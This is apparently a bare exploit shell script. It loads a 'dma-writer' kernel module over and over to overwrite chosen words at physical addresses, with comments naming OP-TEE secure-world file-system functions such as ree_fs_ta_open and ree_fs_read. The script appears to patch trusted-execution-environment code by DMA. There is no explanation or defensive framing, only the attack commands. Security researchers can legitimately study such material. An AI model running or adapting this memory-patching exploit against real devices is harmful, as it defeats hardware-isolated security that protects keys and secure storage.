#!/bin/sh

# ree_fs_ta_open
# 10156c34
insmod dma-writer.ko addr=269839412 data=3943170335
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# 1011687c
insmod dma-writer.ko addr=269576316 data=3019899007
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# 10116888
insmod dma-writer.ko addr=269576328 data=889202879
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# ree_fs_open
insmod dma-writer.ko addr=269577312 data=3942645791
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# ree_fs_ta_read
insmod dma-writer.ko addr=269575468 data=889192031
# echo Press enter to continue... ; read
rmmod dma-writer.ko

# ree_fs_read
insmod dma-writer.ko addr=269575512 data=905967775
# echo Press enter to continue... ; read
rmmod dma-writer.ko
